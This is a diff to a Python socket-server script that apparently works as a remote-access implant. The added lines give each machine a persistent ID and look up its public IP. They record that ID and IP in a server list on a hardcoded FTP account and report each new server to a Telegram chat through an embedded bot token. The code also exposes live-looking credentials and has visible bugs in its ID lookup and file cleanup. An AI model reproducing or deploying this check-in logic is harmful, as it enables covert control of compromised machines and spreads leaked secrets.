@@ -1,4 +1,4 @@
-import socket, tqdm, telebot, os
+import socket, tqdm, telebot, os, ftplib, random, string
 from _thread import *
 from requests import get
 
@@ -7,21 +7,56 @@ BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
 TOKEN = "1888960464:AAFi4PtqqjqprmU3h9m4VnsC30lqmXtH3ho"
 MYID = "1391993288"
+UNIQUE_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+
+if os.path.exists("retarget.key"):
+   f_temp = open("retarget.key","r")
+   UNIQUE_ID = f_temp.read()
+else:
+   with open("retarget.key","w") as f_temp:
+      f_temp.write(UNIQUE_ID)
 
 bot = telebot.TeleBot(TOKEN)
+session = ftplib.FTP('files.000webhost.com','dotnetx','Sasasa123')
+session.encoding='utf-8'
 host = get('https://api.ipify.org').text
 port = 12345
 
 
+activeServers = []
+current_num = -1
+try:
+   session.retrlines('RETR /activeservers.txt', activeServers.append)
+except Exception as e:
+   bot.send_message(MYID,f"Host: {host}\n\nПроизошла ошибка:\n\n{e}")
+   session.retrlines('RETR /activeservers.txt', activeServers.append)
+def check_host(UNIQUE_ID):
+   for num in range(0,len(activeServers)):
+      currLine = activeServers[num].split("_")
+      if currLine[0] == UNIQUE_ID:
+         current_num = num
+         return True
 
-ThreadCount = 0
+if check_host(UNIQUE_ID):
+   if activeServers[current_num].split("_")[1] != host:
+      activeServers[current_num] = UNIQUE_ID+"_"+host
+else:
+   activeServers.append(UNIQUE_ID+"_"+host)
+
+with open("activeservers.txt", "w") as txt_file:
+    for line in activeServers:
+        txt_file.write("".join(line) + "\n")
+
+session.storlines("STOR " + "activeservers.txt", open("activeservers.txt", 'rb'))
+os.unlink("activeServers.txt")
+
 try:
     ServerSideSocket.bind((host, port))
 except socket.error as e:
     ServerSideSocket.bind(("localhost", port))
     print(str(e))
 
-bot.send_message(chat_id=MYID,text=f"[#INITIALIZED_NEW_SERVER]\n\n{host}:{port}")
+bot.send_message(chat_id=MYID,text=f"[#INITIALIZED_NEW_SERVER]\n\n{host}")
 
 print(f"SERVER READY\nListening on: {host}:{port}\n\nReady to work..")
 ServerSideSocket.listen(5)
